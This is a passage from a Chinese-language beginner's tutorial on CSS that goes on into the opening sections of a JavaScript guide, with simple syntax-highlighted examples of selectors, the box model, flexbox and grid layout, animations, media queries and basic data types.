class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">p</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">color</span>: blue;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="3"><li><strong>外部样式表</strong>：将 CSS 样式写在独立的 <code>.css</code> 文件中，然后通过 <code>&lt;link&gt;</code> 标签引入。</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;styles.css&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>推荐使用外部样式表</strong>，因为它可以将样式与内容分离，方便管理和维护。</p><hr><h4 id="CSS-语法"><a href="#CSS-语法" class="headerlink" title="CSS 语法"></a>CSS 语法</h4><p>CSS 的基本语法由 <strong>选择器</strong> 和 <strong>声明块</strong> 组成。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">选择器 &#123;<br>    属性: 值;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>例子</strong>：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">color</span>: green;<br>    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>选择器（Selector）</strong>：指定需要应用样式的 HTML 元素。</li><li><strong>属性（Property）</strong>：定义要改变的样式属性，如颜色、字体大小等。</li><li><strong>值（Value）</strong>：为属性提供具体的样式值。</li></ul><hr><h3 id="选择器详解"><a href="#选择器详解" class="headerlink" title="选择器详解"></a>选择器详解</h3><p>CSS 提供了多种选择器，用于选择 HTML 文档中的元素。通过选择器，你可以精确控制哪些元素应用特定的样式。</p><h4 id="通用选择器"><a href="#通用选择器" class="headerlink" title="通用选择器"></a>通用选择器</h4><p>通用选择器 <code>*</code> 用于选择所有元素。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">* &#123;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="元素选择器"><a href="#元素选择器" class="headerlink" title="元素选择器"></a>元素选择器</h4><p>元素选择器直接选择 HTML 标签中的元素。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">color</span>: black;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上代码将所有 <code>&lt;p&gt;</code> 元素的文本颜色设为黑色。</p><h4 id="类选择器"><a href="#类选择器" class="headerlink" title="类选择器"></a>类选择器</h4><p>类选择器通过元素的 <code>class</code> 属性来选择特定的元素，使用 <code>.</code> 符号。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.myclass</span> &#123;<br>    <span class="hljs-attribute">color</span>: blue;<br>    <span class="hljs-attribute">font-weight</span>: bold;<br>&#125;<br></code></pre></td></tr></table></figure><p>HTML：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;myclass&quot;</span>&gt;</span>这是一个带类名的段落<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="ID-选择器"><a href="#ID-选择器" class="headerlink" title="ID 选择器"></a>ID 选择器</h4><p>ID 选择器通过元素的 <code>id</code> 属性选择，使用 <code>#</code> 符号。ID 选择器的优先级比类选择器高，但在页面中每个 ID 只能使用一次。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-id">#header</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: lightgrey;<br>&#125;<br></code></pre></td></tr></table></figure><p>HTML：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;header&quot;</span>&gt;</span>这是一个头部区域<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a>属性选择器</h4><p>属性选择器根据 HTML 元素的属性值进行选择。语法如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">&quot;text&quot;</span>]</span> &#123;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#000</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>该选择器会为所有 <code>type=&quot;text&quot;</code> 的 <code>input</code> 元素应用样式。</p><h4 id="伪类选择器"><a href="#伪类选择器" class="headerlink" title="伪类选择器"></a>伪类选择器</h4><p>伪类选择器用于选择元素的特定状态，例如当元素被悬停、点击或聚焦时。</p><ul><li>**<code>:hover</code>**：鼠标悬停时应用样式。</li><li>**<code>:focus</code>**：元素获得焦点时应用样式。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>&#125;<br><br><span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:focus</span> &#123;<br>    <span class="hljs-attribute">border-color</span>: blue;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="伪元素选择器"><a href="#伪元素选择器" class="headerlink" title="伪元素选择器"></a>伪元素选择器</h4><p>伪元素选择器用于选择元素的一部分，例如文本的第一个字母或行。</p><ul><li>**<code>::before</code>**：在元素内容之前插入内容。</li><li>**<code>::after</code>**：在元素内容之后插入内容。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span><span class="hljs-selector-pseudo">::before</span> &#123;<br>    <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;🌟 &quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>该代码会在所有 <code>&lt;h1&gt;</code> 元素前插入一个星星符号。</p><hr><h3 id="CSS-盒模型"><a href="#CSS-盒模型" class="headerlink" title="CSS 盒模型"></a>CSS 盒模型</h3><h4 id="盒模型介绍"><a href="#盒模型介绍" class="headerlink" title="盒模型介绍"></a>盒模型介绍</h4><p>CSS 中的每个元素都可以被看作一个盒子，CSS 盒模型描述了盒子的组成部分。盒模型包含以下四个部分：</p><ol><li><strong>内容（Content）</strong>：显示文本或图像的实际区域。</li><li><strong>填充（Padding）</strong>：内容周围的空白区域。</li><li><strong>边框（Border）</strong>：环绕填充和内容的边界。</li><li><strong>边距（Margin）</strong>：元素与其他元素之间的距离。</li></ol><p>盒模型图解：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----------------------+</span><br><span class="hljs-section">|      Margin           |</span><br><span class="hljs-section">+----------------------+</span><br><span class="hljs-section">|      Border           |</span><br><span class="hljs-section">+----------------------+</span><br><span class="hljs-section">|      Padding          |</span><br><span class="hljs-section">+----------------------+</span><br><span class="hljs-section">|      Content          |</span><br><span class="hljs-section">+----------------------+</span><br></code></pre></td></tr></table></figure><h4 id="边距（Margin）"><a href="#边距（Margin）" class="headerlink" title="边距（Margin）"></a>边距（Margin）</h4><p><code>margin</code> 用于设置元素与其他元素之间的外部间距。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>你还可以分别为上下左右边距设置不同的值：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">10px</span>;<br>    <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">15px</span>;<br>    <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;<br>    <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">25px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="填充（Padding）"><a href="#填充（Padding）" class="headerlink" title="填充（Padding）"></a>填充（Padding）</h4><p><code>padding</code> 用于设置内容与边框之间的内部填充空间。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样可以分别设置四个方向的填充：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span> <span class="hljs-number">15px</span> <span class="hljs-number">20px</span> <span class="hljs-number">25px</span>;  <span class="hljs-comment">/* 上，右，下，左 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="边框（Border）"><a href="#边框（Border）" class="headerlink" title="边框（Border）"></a>边框（Border）</h4><p><code>border</code> 用于设置元素的边框。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid black;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>边框的厚度、样式和颜色可以通过 <code>border-width</code>, <code>border-style</code>, <code>border-color</code> 进行单独设置。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">border-width</span>: <span class="hljs-number">2px</span>;<br>    <span class="hljs-attribute">border-style</span>: dashed;<br>    <span class="hljs-attribute">border-color</span>: red;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="CSS-布局"><a href="#CSS-布局" class="headerlink" title="CSS 布局"></a>CSS 布局</h3><h4 id="块级元素与行内元素"><a href="#块级元素与行内元素" class="headerlink" title="块级元素与行内元素"></a>块级元素与行内元素</h4><ul><li><strong>块级元素</strong>（如 <code>&lt;div&gt;</code>, <code>&lt;p&gt;</code>）：占据一整行，多个块级元素会自动换行。</li><li><strong>行内元素</strong>（如 <code>&lt;span&gt;</code>, <code>&lt;a&gt;</code>）：只占据内容的宽度，多个行内元素会排在一行中。</li></ul><h4 id="浮动布局（Float）"><a href="#浮动布局（Float）" class="headerlink" title="浮动布局（Float）"></a>浮动布局（Float）</h4><p><code>float</code> 属性用于让元素左右浮动，从而实现简单的布局。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">float</span>: left;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">10px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>多个浮动元素可以左右排列，浮动布局常用于图片排版和简单的列布局。</p><h4 id="弹性盒模型（Flexbox）"><a href="#弹性盒模型（Flexbox）" class="headerlink" title="弹性盒模型（Flexbox）"></a>弹性盒模型（Flexbox）</h4><p>&#96;flexbox</p><p>&#96; 是现代布局的强大工具，用于创建灵活的响应式布局。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">display</span>: flex;<br>    <span class="hljs-attribute">justify-content</span>: space-between; <span class="hljs-comment">/* 主轴对齐方式 */</span><br>    <span class="hljs-attribute">align-items</span>: center;  <span class="hljs-comment">/* 交叉轴对齐方式 */</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>display: flex</code> 将容器设为弹性盒容器。</li><li><code>justify-content</code> 和 <code>align-items</code> 控制子元素在主轴和交叉轴上的对齐方式。</li></ul><h4 id="网格布局（Grid）"><a href="#网格布局（Grid）" class="headerlink" title="网格布局（Grid）"></a>网格布局（Grid）</h4><p><code>grid</code> 是另一个用于复杂布局的 CSS 工具，允许你创建二维的网格布局。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">display</span>: grid;<br>    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;  <span class="hljs-comment">/* 创建三列等宽布局 */</span><br>    <span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span>;  <span class="hljs-comment">/* 设置网格间距 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>grid-template-columns</code> 定义列的布局，<code>gap</code> 定义网格项之间的间距。</p><hr><h3 id="常见-CSS-属性"><a href="#常见-CSS-属性" class="headerlink" title="常见 CSS 属性"></a>常见 CSS 属性</h3><h4 id="文本样式"><a href="#文本样式" class="headerlink" title="文本样式"></a>文本样式</h4><ul><li>**<code>color</code>**：设置文本颜色。</li><li>**<code>font-size</code>**：设置字体大小。</li><li>**<code>font-family</code>**：设置字体。</li><li>**<code>text-align</code>**：设置文本对齐方式。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">color</span>: blue;<br>    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;<br>    <span class="hljs-attribute">font-family</span>: Arial, sans-serif;<br>    <span class="hljs-attribute">text-align</span>: center;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="背景样式"><a href="#背景样式" class="headerlink" title="背景样式"></a>背景样式</h4><ul><li>**<code>background-color</code>**：设置元素的背景颜色。</li><li>**<code>background-image</code>**：设置背景图片。</li><li>**<code>background-position</code>**：设置背景图片的位置。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: lightgrey;<br>    <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;background.jpg&#x27;</span>);<br>    <span class="hljs-attribute">background-position</span>: center;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="显示与可见性"><a href="#显示与可见性" class="headerlink" title="显示与可见性"></a>显示与可见性</h4><ul><li>**<code>display</code>**：控制元素的显示方式。<ul><li><code>display: block</code>：设置元素为块级元素。</li><li><code>display: inline</code>：设置元素为行内元素。</li><li><code>display: none</code>：隐藏元素，不占据空间。</li></ul></li><li>**<code>visibility</code>**：设置元素的可见性。<ul><li><code>visibility: hidden</code>：隐藏元素，但保留空间。</li></ul></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">display</span>: none;<br>&#125;<br><br><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">visibility</span>: hidden;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="CSS-动画与过渡"><a href="#CSS-动画与过渡" class="headerlink" title="CSS 动画与过渡"></a>CSS 动画与过渡</h3><p>CSS 提供了简单的方式来创建动画效果和过渡效果。</p><ul><li><strong>过渡</strong>（Transition）：元素属性在一段时间内平滑变化。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">button</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: blue;<br>    <span class="hljs-attribute">transition</span>: background-color <span class="hljs-number">0.5s</span>;  <span class="hljs-comment">/* 过渡时间 0.5 秒 */</span><br>&#125;<br><br><span class="hljs-selector-tag">button</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: red;<br>&#125;<br></code></pre></td></tr></table></figure><p>当鼠标悬停时，按钮背景颜色会在 0.5 秒内平滑过渡到红色。</p><ul><li><strong>动画</strong>：定义关键帧动画。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@keyframes</span> example &#123;<br>    <span class="hljs-selector-tag">from</span> &#123;<span class="hljs-attribute">background-color</span>: red;&#125;<br>    <span class="hljs-selector-tag">to</span> &#123;<span class="hljs-attribute">background-color</span>: yellow;&#125;<br>&#125;<br><br><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">animation</span>: example <span class="hljs-number">2s</span> infinite;<br>&#125;<br></code></pre></td></tr></table></figure><p>该动画会让背景颜色从红色逐渐变为黄色，并持续重复。</p><hr><h3 id="响应式设计"><a href="#响应式设计" class="headerlink" title="响应式设计"></a>响应式设计</h3><p>响应式设计让网页能够适配不同设备的屏幕尺寸，如手机、平板、桌面显示器。</p><h4 id="媒体查询"><a href="#媒体查询" class="headerlink" title="媒体查询"></a>媒体查询</h4><p>媒体查询可以根据设备的屏幕大小，应用不同的样式。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">600px</span>) &#123;<br>    <span class="hljs-selector-tag">body</span> &#123;<br>        <span class="hljs-attribute">background-color</span>: lightblue;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当屏幕宽度小于 600 像素时，背景颜色会变成浅蓝色。</p><hr><h3 id="CSS-优化技巧"><a href="#CSS-优化技巧" class="headerlink" title="CSS 优化技巧"></a>CSS 优化技巧</h3><ol><li><strong>合并样式</strong>：将相似的样式合并，减少重复代码。</li><li><strong>减少嵌套</strong>：尽量减少选择器嵌套的层次，以提高可读性和性能。</li><li><strong>使用类选择器</strong>：避免过度依赖 ID 选择器，类选择器的复用性更强。</li><li><strong>使用外部样式表</strong>：将 CSS 放在外部文件中，减少 HTML 文件的大小。</li></ol><hr><h1 id="JavaScript-详尽入门与指南"><a href="#JavaScript-详尽入门与指南" class="headerlink" title="JavaScript 详尽入门与指南"></a>JavaScript 详尽入门与指南</h1><h3 id="目录-6"><a href="#目录-6" class="headerlink" title="目录"></a>目录</h3><ol><li><a href="#javascript-%E5%9F%BA%E7%A1%80">JavaScript 基础</a><ul><li><a href="#javascript-%E7%AE%80%E4%BB%8B">JavaScript 简介</a></li><li><a href="#%E5%9C%A8%E7%BD%91%E9%A1%B5%E4%B8%AD%E5%BC%95%E5%85%A5-javascript">在网页中引入 JavaScript</a></li><li><a href="#javascript-%E8%AF%AD%E6%B3%95">JavaScript 语法</a></li></ul></li><li><a href="#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">数据类型</a><ul><li><a href="#%E5%8E%9F%E5%A7%8B%E7%B1%BB%E5%9E%8B">原始类型</a></li><li><a href="#%E5%AF%B9%E8%B1%A1%E7%B1%BB%E5%9E%8B">对象类型</a></li></ul></li><li><a href="#%E5%8F%98%E9%87%8F%E4%B8%8E%E4%BD%9C%E7%94%A8%E5%9F%9F">变量与作用域</a><ul><li><a href="#%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E">变量声明</a></li><li><a href="#%E4%BD%9C%E7%94%A8%E5%9F%9F%E4%B8%8E%E9%97%AD%E5%8C%85">作用域与闭包</a></li></ul></li><li><a href="#%E6%8E%A7%E5%88%B6%E6%B5%81">控制流</a><ul><li><a href="#%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5">条件语句</a></li><li><a href="#%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5">循环语句</a></li></ul></li><li><a href="#%E5%87%BD%E6%95%B0">函数</a><ul><li><a href="#%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8E">函数声明</a></li><li><a href="#%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0">箭头函数</a></li></ul></li><li><a href="#%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86">事件处理</a></li><li><a href="#%E5%AF%B9%E8%B1%A1%E4%B8%8E%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B">对象与面向对象编程</a></li><li><a href="#%E5%BC%82%E6%AD%A5-javascript">异步 JavaScript</a><ul><li><a href="#%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0">回调函数</a></li><li><a href="#promise">Promise</a></li><li><a href="#asyncawait">async&#x2F;await</a></li></ul></li><li><a href="#javascript-%E4%B8%8E-dom">JavaScript 与 DOM</a><ul><li><a href="#dom-%E6%93%8D%E4%BD%9C">DOM 操作</a></li><li><a href="#%E4%BA%8B%E4%BB%B6%E7%BB%91%E5%AE%9A">事件绑定</a></li></ul></li><li><a href="#%E9%AB%98%E7%BA%A7%E6%A6%82%E5%BF%B5">高级概念</a><ul><li><a href="#%E9%97%AD%E5%8C%85">闭包</a></li><li><a href="#%E5%8E%9F%E5%9E%8B%E9%93%BE">原型链</a></li></ul></li><li><a href="#%E8%B0%83%E8%AF%95%E4%B8%8E%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86">调试与错误处理</a></li></ol><hr><h3 id="JavaScript-基础"><a href="#JavaScript-基础" class="headerlink" title="JavaScript 基础"></a>JavaScript 基础</h3><h4 id="JavaScript-简介"><a href="#JavaScript-简介" class="headerlink" title="JavaScript 简介"></a>JavaScript 简介</h4><p><strong>JavaScript</strong> 是一门动态的、基于事件驱动的编程语言，主要用于开发网页的客户端交互逻辑。它可以操作文档对象模型（DOM），实现用户点击、表单提交等交互操作。</p><hr><h4 id="在网页中引入-JavaScript"><a href="#在网页中引入-JavaScript" class="headerlink" title="在网页中引入 JavaScript"></a>在网页中引入 JavaScript</h4><p>你可以通过以下方式将 JavaScript 添加到 HTML 页面中：</p><ol><li><p><strong>内联 JavaScript</strong>：将 JavaScript 代码直接嵌入到 HTML 元素的 <code>onclick</code> 等事件属性中。</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;Hello World!&#x27;)&quot;</span>&gt;</span>点击我<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>内部脚本</strong>：将 JavaScript 代码放在 <code>&lt;script&gt;</code> 标签中，位于 HTML 文档的 <code>&lt;head&gt;</code> 或 <code>&lt;body&gt;</code> 中。</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello, JavaScript!&#x27;</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>外部脚本</strong>：将 JavaScript 代码放在外部文件中，通过 <code>&lt;script&gt;</code> 标签引用。</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;scripts.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><hr><h4 id="JavaScript-语法"><a href="#JavaScript-语法" class="headerlink" title="JavaScript 语法"></a>JavaScript 语法</h4><p>JavaScript 的基础语法包括：</p><ul><li><strong>区分大小写</strong>：<code>myVariable</code> 与 <code>myvariable</code> 是两个不同的变量。</li><li><strong>语句结束符</strong>：每条 JavaScript 语句可以用分号（<code>;</code>）结束。</li><li><strong>注释</strong>：单行注释用 <code>//</code>，多行注释用 <code>/* */</code>。</li></ul><hr><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>JavaScript 中的数据类型分为 <strong>原始类型</strong> 和 <strong>对象类型</strong>。</p><h4 id="原始类型"><a href="#原始类型" class="headerlink" title="原始类型"></a>原始类型</h4><ul><li><p><strong>Number</strong>：表示数字，如整数和浮点数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> age = <span class="hljs-number">25</span>;<br><span class="hljs-keyword">let</span> price = <span class="hljs-number">19.99</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>String</strong>：表示字符串，使用单引号或双引号。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> name = <span class="hljs-string">&#x27;Alice&#x27;</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>Boolean</strong>：布尔值，只有两个取值：<code>true</code> 或 <code>false</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> isOpen = <span class="hljs-literal">true</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>null</strong>：表示空值，通常用于表示“无”。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> car = <span 